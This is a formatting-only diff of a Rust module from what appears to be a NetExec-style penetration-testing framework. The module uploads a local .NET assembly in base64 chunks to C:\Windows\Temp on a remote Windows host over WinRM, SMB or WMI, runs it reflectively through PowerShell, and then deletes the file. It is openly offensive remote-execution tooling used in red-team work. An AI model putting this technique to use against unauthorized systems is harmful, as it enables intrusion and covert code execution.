@@ -6,11 +6,11 @@
 use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};
 use anyhow::{anyhow, Result};
 use async_trait::async_trait;
-use nxc_protocols::{NxcProtocol, NxcSession};
 use base64::{engine::general_purpose, Engine};
+use nxc_protocols::{NxcProtocol, NxcSession};
 use std::fs;
-use uuid::Uuid;
 use tracing::info;
+use uuid::Uuid;
 
 pub struct ExecuteAssembly;
 
@@ -18,7 +18,7 @@ impl ExecuteAssembly {
     pub fn new() -> Self {
         Self
     }
-    
+
     // Fallback to instantiate the right protocol instance based on the session strings
     // In a cleaner architect, the `NxcSession` would hold a reference, but we can recreate it.
     fn get_protocol(&self, session: &dyn NxcSession) -> Result<Box<dyn NxcProtocol>> {
@@ -26,7 +26,10 @@ impl ExecuteAssembly {
             "winrm" => Ok(Box::new(nxc_protocols::winrm::WinrmProtocol::new())),
             "smb" => Ok(Box::new(nxc_protocols::smb::SmbProtocol::new())),
             "wmi" => Ok(Box::new(nxc_protocols::wmi::WmiProtocol::new())),
-            _ => Err(anyhow!("Protocol {} is not supported by execute-assembly", session.protocol())),
+            _ => Err(anyhow!(
+                "Protocol {} is not supported by execute-assembly",
+                session.protocol()
+            )),
         }
     }
 }
@@ -73,38 +76,49 @@ impl NxcModule for ExecuteAssembly {
         session: &mut dyn NxcSession,
         opts: &ModuleOptions,
     ) -> Result<ModuleResult> {
-        let assembly_path = opts.get("ASSEMBLY").ok_or_else(|| anyhow!("ASSEMBLY option is required"))?;
+        let assembly_path = opts
+            .get("ASSEMBLY")
+            .ok_or_else(|| anyhow!("ASSEMBLY option is required"))?;
         let args = opts.get("ARGS").unwrap_or(&String::new()).to_string();
 
         info!("ExecuteAssembly: Reading local assembly {}", assembly_path);
         let file_bytes = fs::read(assembly_path)?;
         let b64_payload = general_purpose::STANDARD.encode(&file_bytes);
-        
-        info!("ExecuteAssembly: Assembly encoded down to {} bytes", b64_payload.len());
+
+        info!(
+            "ExecuteAssembly: Assembly encoded down to {} bytes",
+            b64_payload.len()
+        );
 
         let protocol = self.get_protocol(session)?;
-        
+
         // Target temp file
         let file_id = Uuid::new_v4().simple().to_string();
         let target_file = format!("C:\\Windows\\Temp\\{}.b64", file_id);
-        
-        info!("ExecuteAssembly: Uploading payload to {} in chunks...", target_file);
-        
+
+        info!(
+            "ExecuteAssembly: Uploading payload to {} in chunks...",
+            target_file
+        );
+
         // Chunk size: 4000 characters to be safe for command limits on cmd.exe (smbexec) or WinRM limits
         let chunk_size = 4000;
         let total_chunks = (b64_payload.len() + chunk_size - 1) / chunk_size;
-        
+
         for (i, chunk) in b64_payload.as_bytes().chunks(chunk_size).enumerate() {
             let chunk_str = std::str::from_utf8(chunk).unwrap();
-            let cmd = format!("powershell -c \"Add-Content -Path '{}' -Value '{}' -NoNewline\"", target_file, chunk_str);
+            let cmd = format!(
+                "powershell -c \"Add-Content -Path '{}' -Value '{}' -NoNewline\"",
+                target_file, chunk_str
+            );
             protocol.execute(session, &cmd).await?;
             if (i + 1) % 10 == 0 || (i + 1) == total_chunks {
                 info!("ExecuteAssembly: Uploaded chunk {}/{}", i + 1, total_chunks);
             }
         }
-        
+
         info!("ExecuteAssembly: Upload complete. Executing assembly reflectively...");
-        
+
         // Convert args string to powershell array format: "arg1", "arg2"
         let ps_args = if args.is_empty() {
             "$null".to_string()
@@ -128,10 +142,10 @@ impl NxcModule for ExecuteAssembly {
              Remove-Item -Path '{}' -Force",
             target_file, ps_args, target_file
         );
-        
+
         let exec_cmd = format!("powershell -c \"{}\"", exec_script);
         let output = protocol.execute(session, &exec_cmd).await?;
-        
+
         Ok(ModuleResult {
             credentials: vec![],
             success: output.exit_code.unwrap_or(0) == 0,
